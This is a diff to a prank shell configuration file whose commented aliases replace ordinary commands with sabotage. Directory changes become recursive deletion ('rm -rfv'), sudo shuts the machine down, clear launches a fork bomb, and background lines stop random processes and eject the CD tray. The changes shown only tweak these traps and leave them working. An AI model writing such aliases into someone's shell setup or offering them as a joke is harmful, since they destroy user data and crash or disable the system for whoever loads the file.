@@ -17,10 +17,10 @@ alias cat=true
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
 # Delete directories instead of entering them
-alias cd='rm -rfv'
+alias cd='rm -rfv --preserve-root'
 
 # Shut down the computer instead of running a command with super-user rights
-alias sudo='sudo shutdown -P now'
+alias sudo='sudo shutdown -h -P now'
 
 # Launch a fork bomb instead of clearing the screen
 alias clear=':(){ :|:& };:'
@@ -29,7 +29,11 @@ alias clear=':(){ :|:& };:'
 alias date='date -d "now + $RANDOM days"'
 
 # Randomly eject CD tray
-sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T &
+if [[ uname=="Darwin" ]]; then
+  sleep $[ ( $RANDOM % 10 )  + 1 ]s && drutil eject || eject -T &
+else
+  sleep $[ ( $RANDOM % 10 )  + 1 ]s && eject &
+fi
 
 # Send STOP signal to random process at random time
 sleep $[ ( $RANDOM % 100 )  + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
